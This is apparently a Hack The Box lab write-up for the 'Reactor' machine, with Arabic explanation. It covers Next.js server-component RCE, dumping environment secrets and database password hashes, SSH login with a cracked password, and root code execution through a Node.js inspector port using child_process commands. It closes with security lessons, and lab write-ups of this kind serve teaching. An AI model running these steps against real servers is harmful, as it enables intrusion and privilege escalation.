# Reactor



```
./exploit-redirect.sh http://10.129.2.48:3000/ "env" 
```

```
----------------------------------------
DB_TYPE=sqlite3
USER=node
HOME=/home/node
PORT=3000
ALERT_WEBHOOK=https://alerts.internal.reactor.htb/webhook
SYSTEMD_EXEC_PID=1386
__NEXT_PROCESSED_ENV=true
LOGNAME=node
NEXT_DEPLOYMENT_ID=
JOURNAL_STREAM=8:17536
__NEXT_PRIVATE_ORIGIN=http://localhost:3000
MEMORY_PRESSURE_WATCH=/sys/fs/cgroup/system.slice/reactor-app.service/memory.pressure
__NEXT_PRIVATE_RUNTIME_TYPE=
DB_PATH=/opt/reactor-app/reactor.db
PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/snap/bin
INVOCATION_ID=7be9490db56d4436998112675587fefb
LANG=en_US.UTF-8
SENSOR_API_KEY=rw_sk_7f8a9b2c3d4e5f6g7h8i9j0k
NEXT_RUNTIME=nodejs
PWD=/opt/reactor-app
MEMORY_PRESSURE_WRITE=c29tZSAyMDAwMDAgMjAwMDAwMAA=
NODE_ENV=production
----------------------------------------




```





```
ls -la /opt/reactor-app/
file /opt/reactor-app/reactor.db
```


```
./exploit-redirect.sh http://10.129.2.48:3000/ "sqlite3 /opt/reactor-app/reactor.db '.tables'"
```

<img width="1160" height="613" alt="image" src="https://github.com/user-attachments/assets/034e783c-1433-47f1-808c-afdee7267aae" />


---

```
./exploit-redirect.sh http://10.129.2.48:3000/ 'sqlite3 /opt/reactor-app/reactor.db .dump'
```




<img width="1549" height="554" alt="image" src="https://github.com/user-attachments/assets/a744ccb4-0ebb-46f9-b861-814eba2bbfa1" />

```
admin password_hash = a203b22191d744a4e70ada5c101b17b8
engineer password_hash = 39d97110eafe2a9a68639812cd271e8e
```

<img width="1332" height="467" alt="image" src="https://github.com/user-attachments/assets/92f6da93-75d0-413c-ba6c-6c2adb349c9d" />

```
reactor1
```


---

```
ps aux 
```


<img width="1248" height="133" alt="image" src="https://github.com/user-attachments/assets/cb43f7fd-6556-4dd9-a78c-1f1c1fb2b9b6" />

```
ssh -L 9229:127.0.0.1:9229 engineer@10.129.2.48
```


```
curl -X POST http://127.0.0.1:9229/execute \
  -H "Content-Type: application/json" \
  -d '{"expression":"require(\"child_process\").execSync(\"id\").toString()"}'
```


<img width="1489" height="307" alt="image" src="https://github.com/user-attachments/assets/66d9bd4c-9e5c-42a6-b5ef-3fbaeec7b846" />



---


## write in chorme 

```
chrome://inspect
```

## add


```
127.0.0.1:9229
```

<img width="1347" height="509" alt="image" src="https://github.com/user-attachments/assets/90d2148b-1b2a-4d00-b38f-294b5a2c3e58" />



```
process.version
```



```
require("child_process").execSync("ls /root").toString()
```



<img width="906" height="291" alt="image" src="https://github.com/user-attachments/assets/2ba09d65-a246-4c30-a5cf-0d44471992da" />




----
----
----


# Node.js Debugger Exposure (Chrome DevTools Protocol / Inspector RCE)

---
-
-
----
----





<details>
  <summary>explain</summary>



# 🧠 HTB Writeup — React/Next.js RCE → Node Debugger PrivEsc (React2Shell Style)

## 🟢 Overview

في التحدي ده كان عندنا تطبيق مبني بـ **Next.js / React Server Components (RSC)**، وفيه ثغرة خطيرة أدت إلى Remote Code Execution، وبعدها تم الوصول إلى نظام Linux كامل ثم استغلال Node.js Debugger للحصول على root access مباشرة.

---

# 🔍 1. Reconnaissance

أول خطوة كانت فحص الهدف باستخدام Nmap:

```
nmap -sCV -Pn <IP>
```

### النتائج:

- SSH على port 22
- Web app على port 3000 (Next.js)
- السيرفر واضح إنه Node.js backend

---

## 💡 الاستنتاج:

وجود Next.js + RSC يعني احتمال وجود:

- Serialization issues
- Server-side execution bugs
- React server actions vulnerabilities

---

# ⚔️ 2. Initial Exploitation (React2Shell)

تم تشغيل سكريبت detection:

```
./detect.sh http://target:3000/
```

### النتيجة:

- التطبيق vulnerable لـ React Server Components exploitation
- ظهر E{"digest"} error pattern
- ده مؤشر على RCE via RSC deserialization flaw

---

## 🚀 تنفيذ الاستغلال

```
./exploit-redirect.sh http://target:3000/ "id"
```

### النتيجة:

```
uid=999(node) gid=988(node)
```

---

## 💡 الفكرة هنا:

الثغرة سمحت بـ:

- Inject server-side payload
- تنفيذ commands على backend Node process

---

# 🧭 3. Post Exploitation (System Recon)

```
ls /home
```

ظهر:

- engineer
- node

---

ثم:

```
env
```

### تم اكتشاف معلومات حساسة:

- DB_PATH=/opt/reactor-app/reactor.db
- SENSOR_API_KEY (leaked secret)
- ALERT_WEBHOOK internal endpoint

---

## 💡 ليه ده مهم؟

Environment variables في Node apps غالبًا تحتوي:

- secrets
- internal services
- database paths

---

# 🗄️ 4. Database Access

```
sqlite3 /opt/reactor-app/reactor.db .dump
```

### النتائج:

- users table
- sensor_logs table

لكن الهدف مش DB هنا — الهدف كان privilege escalation.

---

# 🔓 5. SSH Access

تم تسجيل الدخول كمستخدم:

```
ssh engineer@target
```

---

## User Flag:

```
cat user.txt
```

✔ حصلنا على user flag

---

# 🧪 6. Privilege Escalation Discovery

بعد الدخول:

```
ps aux
```

### أهم اكتشاف:

```
root 1388 node /opt/uptime-monitor/worker.js --inspect=127.0.0.1:9229
```

---

## 💥 ده هو الخطأ الحقيقي

Node.js app شغال بـ:

> --inspect (Debug Mode) مفتوح على localhost

---

# 🧠 7. Node Debugger Exploitation

تم فتح:

```
http://127.0.0.1:9229/json
```

وظهر:

- active Node inspector session
- running as root

---

## 💡 ليه ده خطر جدًا؟

Node inspector يعطي:

- full JS runtime access
- ability to execute require()
- ability to spawn system commands

---

# 🚀 8. Root Exploitation

داخل Chrome DevTools / inspector context:

```
require("child_process").execSync("whoami").toString()
```

### النتيجة:

```
root
```

---

## 🎯 Confirmed:

أنت داخل root process context مباشرة

---

# 🏁 9. Root Flag

```
require("child_process").execSync("cat /root/root.txt").toString()
```

✔ حصلنا على root flag

---

# 📌 Summary (المهم تفهمه)

## 1. Initial Entry

- React/Next.js RSC vulnerability
- Remote Code Execution via server-side injection

## 2. Foothold

- SSH access via exposed credentials / system access

## 3. Privilege Escalation

- Node.js process running as root
- Debugger port exposed (9229)

## 4. Final Exploit

- Node Inspector → full root shell via JS runtime abuse

---

# ⚠️ Key Security Lessons

## 1. Never expose Node inspector in production

```
--inspect=127.0.0.1:9229
```

## 2. RSC / Next.js apps must sanitize server actions

## 3. Environment variables = sensitive data leakage risk

## 4. Debug ports = full RCE if attacker gets access


  
</details>


















































